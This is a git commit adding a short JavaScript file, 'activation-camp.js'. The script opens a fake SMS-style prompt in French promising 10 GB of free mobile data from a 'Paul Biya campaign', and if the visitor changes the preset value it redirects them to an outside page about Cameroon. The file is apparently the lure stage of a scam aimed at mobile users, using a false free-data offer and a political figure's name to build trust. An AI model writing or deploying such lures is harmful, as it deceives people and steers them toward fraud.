d7fcc43df07c1bb69138aab5ab2df42bb3359f06
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-09 11:01:34 +0100

    Create activation-camp.js

---
+++ activation-camp.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 10 Go'
+password=prompt('SMS: Félicitations, votre numéro de mobile est éligible pour recevoir 10 Go de données gratuites en ligne de la campagne Paul Biya, ccliquez sur OK pour activer maintenant','ACTIVER 10 Go');
+if (password != 'ACTIVER 10 Go') {
+location.href='https://ghrant.org/cameroon.html';
+}
